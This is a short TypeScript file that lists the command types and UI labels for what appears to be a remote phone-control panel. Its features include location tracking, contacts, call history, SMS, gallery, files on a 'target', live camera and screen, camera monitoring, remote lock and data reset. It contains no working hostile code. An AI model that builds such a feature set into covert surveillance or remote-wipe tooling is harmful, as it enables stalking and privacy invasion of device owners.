export type CommandType = 
  | "lacak" | "notifikasi" | "device_gallery" | "daftar_kontak" 
  | "riwayat_panggilan" | "live_camera" | "app_management" 
  | "ganti_wallpaper" | "hidupkan_senter" | "kunci_layar" 
  | "camera_monitoring" | "putar_video" | "file_target" 
  | "pesan_sms" | "live_screen" | "device_lock_pro" | "reset_data";

export const FEATURES: { id: CommandType; label: string; icon: string }[] = [
  { id: "lacak", label: "Lacak", icon: "map-pin" },
  { id: "notifikasi", label: "Notifikasi", icon: "bell" },
  { id: "device_gallery", label: "Gallery", icon: "image" },
  { id: "daftar_kontak", label: "Kontak", icon: "users" },
  { id: "riwayat_panggilan", label: "Panggilan", icon: "phone" },
  { id: "live_camera", label: "Live Cam", icon: "camera" },
  { id: "app_management", label: "Apps", icon: "grid" },
  { id: "ganti_wallpaper", label: "Wallpaper", icon: "aperture" },
  { id: "hidupkan_senter", label: "Senter", icon: "flashlight" },
  { id: "kunci_layar", label: "Lock", icon: "lock" },
  { id: "camera_monitoring", label: "Cam Monitor", icon: "eye" },
  { id: "putar_video", label: "Play Video", icon: "play" },
  { id: "file_target", label: "Files", icon: "folder" },
  { id: "pesan_sms", label: "SMS", icon: "message-square" },
  { id: "live_screen", label: "Live Screen", icon: "monitor" },
  { id: "device_lock_pro", label: "Lock PRO", icon: "shield" },
  { id: "reset_data", label: "Reset", icon: "refresh-cw" },
];
